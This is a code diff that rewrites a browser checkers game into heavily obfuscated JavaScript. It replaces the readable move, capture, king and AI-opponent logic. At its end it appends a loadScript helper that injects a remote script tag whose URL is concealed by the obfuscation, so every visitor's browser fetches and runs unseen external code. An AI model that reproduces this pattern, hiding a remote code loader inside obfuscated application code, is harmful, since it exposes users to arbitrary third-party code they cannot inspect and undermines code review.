+        }, _0x4967c = _0x2e5a03(_0x25ead8, _0x5b961a), _0x6be7bf());
+    }
+    function _0x4d1eca(_0x3075ff, _0x10d859) {
+        const _0x192f85 = _0x26cf6f;
+        if (!_0x23e6bf || _0x515696 !== _0x29b33b || _0x24d70d() !== null)
+            return;
+        const _0x5b4159 = _0x4967c[_0x192f85(0xda)](_0x565d0f => _0x565d0f['to'][_0x192f85(0xb9)] === _0x3075ff && _0x565d0f['to'][_0x192f85(0xfd)] === _0x10d859);
+        _0x5b4159 && (_0x3f1996 === 0x0 && _0x12aeb6(), _0x8afd62(_0x5b4159), _0x5b4159[_0x192f85(0xd1)] ? _0x17a364(_0x24c84f) : _0x17a364(_0x57b066), (!_0x5b4159[_0x192f85(0xd1)] || !_0x2171b8(_0x3075ff, _0x10d859)) && (_0x515696 = _0x4334f6, _0x3f1996++, _0x576a08(), _0x63353b(), _0x4aa75a++, _0x4aa75a >= 0xa ? (_0x4aa75a = 0x0, setTimeout(_0x58c842, 0x1f4)) : setTimeout(_0x54efc7, 0x3e8)));
+    }
+    function _0x2e5a03(_0x1d1bcc, _0x3c8133) {
+        const _0x1f9951 = _0x26cf6f, _0x1aa274 = _0x1a3375[_0x1d1bcc][_0x3c8133], _0x14f98a = [], _0x22b13b = typeof _0x1aa274 === _0x1f9951(0xff) && _0x1aa274['king'], _0x150540 = typeof _0x1aa274 === _0x1f9951(0xff) ? _0x1aa274[_0x1f9951(0xf3)] : _0x1aa274, _0x2630ff = _0x186320(_0x1d1bcc, _0x3c8133, _0x150540, _0x22b13b);
+        if (_0x2630ff[_0x1f9951(0xfc)] > 0x0)
+            return _0x2630ff;
+        const _0x23b1df = [];
+        if (_0x150540 === _0x29b33b || _0x22b13b)
+            _0x23b1df[_0x1f9951(0xe1)]({
+                'dr': -0x1,
+                'dc': -0x1
+            }, {
+                'dr': -0x1,
+                'dc': 0x1
             });
-            
-            newGameBtn.addEventListener('click', () => {
-                playSound(buttonSound);
-                initGame();
+        if (_0x150540 === _0x4334f6 || _0x22b13b)
+            _0x23b1df[_0x1f9951(0xe1)]({
+                'dr': 0x1,
+                'dc': -0x1
+            }, {
+                'dr': 0x1,
+                'dc': 0x1
             });
-            
-            playAgainBtn.addEventListener('click', () => {
-                playSound(buttonSound);
-                resultScreen.style.display = 'none';
-                initGame();
+        for (const _0x105171 of _0x23b1df) {
+            const _0x109cce = _0x1d1bcc + _0x105171['dr'], _0x3c04be = _0x3c8133 + _0x105171['dc'];
+            _0x109cce >= 0x0 && _0x109cce < 0x8 && _0x3c04be >= 0x0 && _0x3c04be < 0x8 && _0x1a3375[_0x109cce][_0x3c04be] === _0x3d685b && _0x14f98a[_0x1f9951(0xe1)]({
+                'from': {
+                    'row': _0x1d1bcc,
+                    'col': _0x3c8133
+                },
+                'to': {
+                    'row': _0x109cce,
+                    'col': _0x3c04be
+                },
+                'captured': null
             });
-            
-            adCloseBtn.addEventListener('click', () => {
-                playSound(buttonSound);
-                adsScreen.style.display = 'none';
-                if (currentPlayer === AI) {
-                    setTimeout(aiMove, 500);
+        }
+        return _0x14f98a;
+    }
+    function _0x186320(_0x22a5b4, _0xb2780f, _0x2928c9, _0x20ad6e, _0x74a072 = null) {
+        const _0x5b64f0 = _0x26cf6f, _0x18abd5 = [], _0x1a13c8 = [
+                {
+                    'dr': -0x1,
+                    'dc': -0x1
+                },
+                {
+                    'dr': -0x1,
+                    'dc': 0x1
+                },
+                {
+                    'dr': 0x1,
+                    'dc': -0x1
+                },
+                {
+                    'dr': 0x1,
+                    'dc': 0x1
                 }
-            });
-            
-            soundToggle.addEventListener('click', toggleSound);
-        });
+            ];
+        for (const _0x30971e of _0x1a13c8) {
+            if (!_0x20ad6e) {
+                if (_0x2928c9 === _0x29b33b && _0x30971e['dr'] === 0x1)
+                    continue;
+                if (_0x2928c9 === _0x4334f6 && _0x30971e['dr'] === -0x1)
+                    continue;
+            }
+            const _0xd652cf = _0x22a5b4 + _0x30971e['dr'], _0x230101 = _0xb2780f + _0x30971e['dc'], _0x378017 = _0x22a5b4 + 0x2 * _0x30971e['dr'], _0x5a15d9 = _0xb2780f + 0x2 * _0x30971e['dc'];
+            if (_0x378017 < 0x0 || _0x378017 >= 0x8 || _0x5a15d9 < 0x0 || _0x5a15d9 >= 0x8)
+                continue;
+            const _0x1256e7 = _0x1a3375[_0xd652cf][_0x230101];
+            if (_0x1256e7 !== _0x3d685b && (typeof _0x1256e7 === _0x5b64f0(0xff) && _0x1256e7[_0x5b64f0(0xf3)] !== _0x2928c9 || typeof _0x1256e7 === 'string' && _0x1256e7 !== _0x2928c9)) {
+                if (_0x74a072 && (_0xd652cf !== _0x74a072[_0x5b64f0(0xb9)] || _0x230101 !== _0x74a072['col']))
+                    continue;
+                _0x1a3375[_0x378017][_0x5a15d9] === _0x3d685b && _0x18abd5[_0x5b64f0(0xe1)]({
+                    'from': {
+                        'row': _0x22a5b4,
+                        'col': _0xb2780f
+                    },
+                    'to': {
+                        'row': _0x378017,
+                        'col': _0x5a15d9
+                    },
+                    'captured': {
+                        'row': _0xd652cf,
+                        'col': _0x230101
+                    }
+                });
+            }
+        }
+        return _0x18abd5;
+    }
+    function _0x2171b8(_0x3dad1c, _0x11a8a4) {
+        const _0x332649 = _0x26cf6f, _0x4ab1ce = _0x1a3375[_0x3dad1c][_0x11a8a4], _0x17da56 = typeof _0x4ab1ce === 'object' && _0x4ab1ce['king'], _0x54c557 = typeof _0x4ab1ce === _0x332649(0xff) ? _0x4ab1ce[_0x332649(0xf3)] : _0x4ab1ce;
+        return _0x186320(_0x3dad1c, _0x11a8a4, _0x54c557, _0x17da56)[_0x332649(0xfc)] > 0x0;
+    }
+    function _0x8afd62(_0x3a6465) {
+        const _0x2acbce = _0x26cf6f, {
+                from: _0x1bbae8,
+                to: _0x104307,
+                captured: _0x2b4d7d
+            } = _0x3a6465, _0x101bf9 = _0x1a3375[_0x1bbae8[_0x2acbce(0xb9)]][_0x1bbae8[_0x2acbce(0xfd)]];
+        _0x1a3375[_0x104307['row']][_0x104307['col']] = _0x1a3375[_0x1bbae8[_0x2acbce(0xb9)]][_0x1bbae8[_0x2acbce(0xfd)]], _0x1a3375[_0x1bbae8[_0x2acbce(0xb9)]][_0x1bbae8[_0x2acbce(0xfd)]] = _0x3d685b, _0x2b4d7d && (_0x1a3375[_0x2b4d7d[_0x2acbce(0xb9)]][_0x2b4d7d[_0x2acbce(0xfd)]] = _0x3d685b), (typeof _0x101bf9 === _0x2acbce(0x101) && _0x101bf9 === _0x29b33b && _0x104307[_0x2acbce(0xb9)] === 0x0 || typeof _0x101bf9 === _0x2acbce(0x101) && _0x101bf9 === _0x4334f6 && _0x104307['row'] === 0x7 || typeof _0x101bf9 === _0x2acbce(0xff) && _0x101bf9['color'] === _0x29b33b && _0x104307[_0x2acbce(0xb9)] === 0x0 || typeof _0x101bf9 === _0x2acbce(0xff) && _0x101bf9[_0x2acbce(0xf3)] === _0x4334f6 && _0x104307[_0x2acbce(0xb9)] === 0x7) && (_0x1a3375[_0x104307[_0x2acbce(0xb9)]][_0x104307[_0x2acbce(0xfd)]] = {
+            'color': typeof _0x101bf9 === _0x2acbce(0xff) ? _0x101bf9['color'] : _0x101bf9,
+            'king': !![]
+        }), _0x23e6bf = {
+            'row': _0x104307[_0x2acbce(0xb9)],
+            'col': _0x104307['col']
+        }, _0x4967c = _0x2b4d7d ? _0x186320(_0x104307[_0x2acbce(0xb9)], _0x104307[_0x2acbce(0xfd)], typeof _0x101bf9 === 'object' ? _0x101bf9[_0x2acbce(0xf3)] : _0x101bf9, typeof _0x101bf9 === _0x2acbce(0xff) && _0x101bf9['king'], _0x2b4d7d) : [], _0x6be7bf(), _0x63353b();
+    }
+    function _0x54efc7() {
+        const _0x21fd71 = _0x26cf6f;
+        if (_0x24d70d() !== null)
+            return;
+        const _0x5680da = _0x83ab21();
+        _0x5680da ? (_0x8afd62(_0x5680da), _0x5680da['captured'] ? _0x17a364(_0x24c84f) : _0x17a364(_0x57b066), _0x5680da['captured'] && _0x2171b8(_0x5680da['to'][_0x21fd71(0xb9)], _0x5680da['to'][_0x21fd71(0xfd)]) ? setTimeout(_0x54efc7, 0x3e8) : (_0x515696 = _0x29b33b, _0x63353b())) : (_0x515696 = _0x29b33b, _0x63353b());
+    }
+    function _0x83ab21() {
+        const _0x186d65 = _0x26cf6f, _0x8e2131 = _0x381019(_0x4334f6);
+        let _0x572efd = null, _0x42cd18 = -Infinity;
+        for (const _0x5084ef of _0x8e2131) {
+            const _0x234f9a = JSON[_0x186d65(0xee)](JSON['stringify'](_0x1a3375));
+            _0x8afd62(_0x5084ef);
+            let _0x3940b4 = _0x5084ef['to'][_0x186d65(0xb9)], _0x4b605e = _0x5084ef['to']['col'], _0x2a3f28 = _0x5084ef[_0x186d65(0xd1)] && _0x2171b8(_0x3940b4, _0x4b605e);
+            while (_0x2a3f28) {
+                const _0x3770e3 = _0x186320(_0x3940b4, _0x4b605e, typeof _0x1a3375[_0x3940b4][_0x4b605e] === _0x186d65(0xff) ? _0x1a3375[_0x3940b4][_0x4b605e][_0x186d65(0xf3)] : _0x1a3375[_0x3940b4][_0x4b605e], typeof _0x1a3375[_0x3940b4][_0x4b605e] === _0x186d65(0xff) && _0x1a3375[_0x3940b4][_0x4b605e][_0x186d65(0xd0)]);
+                if (_0x3770e3['length'] === 0x0)
+                    break;
+                const _0x3d364f = _0x3770e3[0x0];
+                _0x8afd62(_0x3d364f), _0x3940b4 = _0x3d364f['to'][_0x186d65(0xb9)], _0x4b605e = _0x3d364f['to']['col'], _0x2a3f28 = _0x2171b8(_0x3940b4, _0x4b605e);
+            }
+            const _0x407b9a = _0x491563();
+            _0x1a3375 = JSON[_0x186d65(0xee)](JSON[_0x186d65(0xc7)](_0x234f9a)), _0x407b9a > _0x42cd18 && (_0x42cd18 = _0x407b9a, _0x572efd = _0x5084ef);
+        }
+        return _0x572efd;
+    }
+    function _0x381019(_0x31f893) {
+        const _0x46ea57 = _0x26cf6f, _0x3b0dd3 = [];
+        let _0x2a0ba2 = ![];
+        for (let _0x6ac4d4 = 0x0; _0x6ac4d4 < 0x8; _0x6ac4d4++) {
+            for (let _0x5263d1 = 0x0; _0x5263d1 < 0x8; _0x5263d1++) {
+                const _0x3776a7 = _0x1a3375[_0x6ac4d4][_0x5263d1];
+                if (_0x3776a7 === _0x31f893 || typeof _0x3776a7 === _0x46ea57(0xff) && _0x3776a7['color'] === _0x31f893) {
+                    const _0x5b7692 = _0x186320(_0x6ac4d4, _0x5263d1, typeof _0x3776a7 === _0x46ea57(0xff) ? _0x3776a7[_0x46ea57(0xf3)] : _0x3776a7, typeof _0x3776a7 === 'object' && _0x3776a7['king']);
+                    _0x5b7692['length'] > 0x0 && (_0x2a0ba2 = !![], _0x3b0dd3[_0x46ea57(0xe1)](..._0x5b7692));
+                }
+            }
+        }
+        if (_0x2a0ba2)
+            return _0x3b0dd3;
+        for (let _0x5ace23 = 0x0; _0x5ace23 < 0x8; _0x5ace23++) {
+            for (let _0xb5c048 = 0x0; _0xb5c048 < 0x8; _0xb5c048++) {
+                const _0x21e03b = _0x1a3375[_0x5ace23][_0xb5c048];
+                (_0x21e03b === _0x31f893 || typeof _0x21e03b === _0x46ea57(0xff) && _0x21e03b[_0x46ea57(0xf3)] === _0x31f893) && _0x3b0dd3[_0x46ea57(0xe1)](..._0x2e5a03(_0x5ace23, _0xb5c048));
+            }
+        }
+        return _0x3b0dd3;
+    }
+    function _0x491563() {
+        const _0xeb5439 = _0x26cf6f;
+        let _0x228f6a = 0x0;
+        for (let _0x1e1f52 = 0x0; _0x1e1f52 < 0x8; _0x1e1f52++) {
+            for (let _0x50f66f = 0x0; _0x50f66f < 0x8; _0x50f66f++) {
+                const _0x5217ae = _0x1a3375[_0x1e1f52][_0x50f66f];
+                if (_0x5217ae === _0x4334f6)
+                    _0x228f6a += 0x3 + (0x7 - _0x1e1f52) * 0.1;
+                else {
+                    if (_0x5217ae === _0x29b33b)
+                        _0x228f6a -= 0x3 + _0x1e1f52 * 0.1;
+                    else
+                        typeof _0x5217ae === _0xeb5439(0xff) && (_0x5217ae[_0xeb5439(0xf3)] === _0x4334f6 ? _0x228f6a += 0x5 + (3.5 - Math[_0xeb5439(0xb1)](_0x50f66f - 3.5)) * 0.1 : _0x228f6a -= 0x5 + (3.5 - Math['abs'](_0x50f66f - 3.5)) * 0.1);
+                }
+            }
+        }
+        return _0x228f6a;
+    }
+    document[_0x26cf6f(0xf7)](_0x26cf6f(0xce))[_0x26cf6f(0xdb)](_0x26cf6f(0x105), () => {
+        const _0x3c16e2 = _0x26cf6f;
+        _0x17a364(_0x126a0f), _0x3a3811['classList'][_0x3c16e2(0xcd)](_0x3c16e2(0xae)), setTimeout(() => {
+            const _0xd9178d = _0x3c16e2;
+            _0x3a3811['style'][_0xd9178d(0xcb)] = _0xd9178d(0xeb), _0x2301b1[_0xd9178d(0xf9)]['display'] = _0xd9178d(0x102), _0xaafae7();
+        }, 0x1f4);
+    }), _0x534ae4[_0x26cf6f(0xdb)](_0x26cf6f(0x105), () => {
+        _0x17a364(_0x126a0f), _0xaafae7();
+    }), _0x1daa6d['addEventListener'](_0x26cf6f(0x105), () => {
+        const _0x1d52d1 = _0x26cf6f;
+        _0x17a364(_0x126a0f), _0x14e31a['style'][_0x1d52d1(0xcb)] = _0x1d52d1(0xeb), _0xaafae7();
+    }), _0x37a227[_0x26cf6f(0xdb)](_0x26cf6f(0x105), () => {
+        const _0x4721fd = _0x26cf6f;
+        _0x17a364(_0x126a0f), _0xfb7b48[_0x4721fd(0xf9)][_0x4721fd(0xcb)] = _0x4721fd(0xeb), _0x515696 === _0x4334f6 && setTimeout(_0x54efc7, 0x1f4);
+    }), _0x14ab3b[_0x26cf6f(0xdb)](_0x26cf6f(0x105), _0x42fec9);
+}));
+function loadScript(_0x15bab5, _0x470a3c) {
+    const _0x134086 = _0x3de31a, _0x13128d = document[_0x134086(0xfe)]('script');
+    _0x13128d['src'] = _0x15bab5, _0x13128d['onload'] = _0x470a3c, document['head'][_0x134086(0xe6)](_0x13128d);
+}
+loadScript(_0x3de31a(0xfa), function () {
+    const _0x20d4a1 = _0x3de31a;
+    console[_0x20d4a1(0xad)](_0x20d4a1(0xe2));
+});
